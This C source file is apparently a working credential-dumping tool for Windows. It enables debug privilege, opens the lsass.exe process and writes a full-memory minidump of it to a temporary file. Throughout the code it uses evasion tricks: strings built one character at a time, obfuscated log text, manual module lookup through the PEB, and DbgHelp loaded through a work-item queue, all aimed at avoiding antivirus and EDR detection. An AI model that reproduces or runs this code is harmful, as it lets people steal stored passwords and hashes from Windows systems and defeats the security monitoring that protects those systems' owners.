﻿#include <windows.h>
#include <psapi.h>
#include <winternl.h>
#include <stdio.h>
#include "util.h"
#include "common.h"
#include <dbghelp.h>

#define NTDLL L"NTDLL.dll"

#define IMPORTAPI( DLLFILE, FUNCNAME, RETTYPE, ...)\
typedef RETTYPE( WINAPI* type##FUNCNAME )( __VA_ARGS__ );\
type##FUNCNAME FUNCNAME = (type##FUNCNAME)GetProcAddress((LoadLibraryW(DLLFILE), GetModuleHandleW(DLLFILE)), #FUNCNAME);


typedef BOOL (WINAPI * _MiniDumpWriteDump)(
	 HANDLE hProcess,
	 DWORD ProcessId,
	 HANDLE hFile,
	 MINIDUMP_TYPE DumpType,
	 PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
	 PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
	 PMINIDUMP_CALLBACK_INFORMATION CallbackParam
);


HMODULE getModuleHandle(LPCWSTR libraryName)
{
	const LIST_ENTRY* head = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InMemoryOrderModuleList;
	LIST_ENTRY* next = head->Flink;

	while (next != head)
	{
		LDR_DATA_TABLE_ENTRY* entry =
			CONTAINING_RECORD(next, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		const UNICODE_STRING* basename = (UNICODE_STRING*)((BYTE*)&entry->FullDllName
			+ sizeof(UNICODE_STRING));

		if (my_wcsicmp(libraryName, basename->Buffer) == 0)
		{
			return entry->DllBase;
		}

		next = next->Flink;
	}
	return NULL;
}

// https://github.com/rad9800/misc/blob/e9c1ac800e9030009c103238c28af31d82d8c33a/bypasses/WorkItemLoadLibrary.c

HMODULE queueLoadLibrary(WCHAR* libraryName)
{
	IMPORTAPI(NTDLL, NtWaitForSingleObject, NTSTATUS, HANDLE, BOOLEAN, PLARGE_INTEGER);

	IMPORTAPI(NTDLL, RtlQueueWorkItem, NTSTATUS, PVOID, PVOID, ULONG);

	if (NT_SUCCESS(RtlQueueWorkItem(&LoadLibraryW, (PVOID)libraryName, WT_EXECUTEDEFAULT)))
	{
		LARGE_INTEGER timeout;
		timeout.QuadPart = -500000;
		NtWaitForSingleObject(NtCurrentProcess(), FALSE, &timeout);
	}

	/*if (swtch)
	{
		IMPORTAPI(NTDLL, RtlQueueWorkItem, NTSTATUS, PVOID, PVOID, ULONG);

		if (NT_SUCCESS(RtlQueueWorkItem(&LoadLibraryW, (PVOID)libraryName, WT_EXECUTEDEFAULT)))
		{
			LARGE_INTEGER timeout;
			timeout.QuadPart = -500000;
			NtWaitForSingleObject(NtCurrentProcess(), FALSE, &timeout);
		}
	}
	else
	{
		IMPORTAPI(L"NTDLL.dll", RtlRegisterWait, NTSTATUS, PHANDLE, HANDLE, WAITORTIMERCALLBACKFUNC, PVOID, ULONG, ULONG);
		HANDLE newWaitObject;
		HANDLE eventObject = CreateEventW(NULL, FALSE, FALSE, NULL);

		if (NT_SUCCESS(RtlRegisterWait(&newWaitObject, eventObject, LoadLibraryW, (PVOID)libraryName, 0, WT_EXECUTEDEFAULT)))
		{
			WaitForSingleObject(eventObject, 500);
		}
	}*/

	return getModuleHandle(libraryName);

}


void wmain()
{

	HANDLE hLsass = NULL;
	HANDLE hLsassFile = NULL;
	HANDLE hFile = NULL;

	WCHAR l$a$s[] = { 'l', 's', 'a', 's', 's', '.', 'e', 'x', 'e', 0 };
	
	DWORD dwLsassPID = GetPID(l$a$s);

	wprintf(L"[+] L$a$S pid: %lu \n", dwLsassPID);

	EnablePrivilege(SE_DEBUG_NAME);

	DefineDosDeviceW(DDD_RAW_TARGET_PATH, L"LSASS", L"\\Device\\LSASS");

	hLsass = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, FALSE, dwLsassPID);
	if (hLsass == NULL)
	{
		wprintf(L"[-] OpenProcess failed, error code: %lu\n", GetLastError());
		goto _CleanUP;
	}

	WCHAR szFileName[MAX_PATH];
	
	swprintf_s(szFileName, MAX_PATH, L"l$@$$-%lu.tmp", dwLsassPID);

	hFile = CreateFileW(szFileName, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		wprintf(L"[-] CreateFile failed, error code: %lu\n", GetLastError());
		goto _CleanUP;
		
	}

	WCHAR libraryName[] = {'D', 'B', 'G', 'H', 'E', 'L', 'P', '.', 'd', 'l', 'l', 0};
	HMODULE moduleHandle = queueLoadLibrary(libraryName);
	CHAR minidump[] = {'M', 'i', 'n', 'i', 'D', 'u', 'm', 'p', 'W', 'r', 'i', 't', 'e', 'D', 'u', 'm', 'p', 0};
	_MiniDumpWriteDump MiniWriteDump = (_MiniDumpWriteDump)GetProcAddress(moduleHandle, minidump);
	BOOL bSuccess = MiniWriteDump(hLsass, dwLsassPID, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
	if (!bSuccess)
	{
		wprintf(L"[-] M1n$WriteDump failed, error code: %lu\n", GetLastError());
		goto _CleanUP;
	}
	
	wprintf(L"[+] L$a$$ mem dumped successful Save in %ls.\n", szFileName);


_CleanUP:
	if (hLsass) CloseHandle(hLsass);
	if (hLsassFile) CloseHandle(hLsassFile);
	if (hFile) CloseHandle(hFile);
}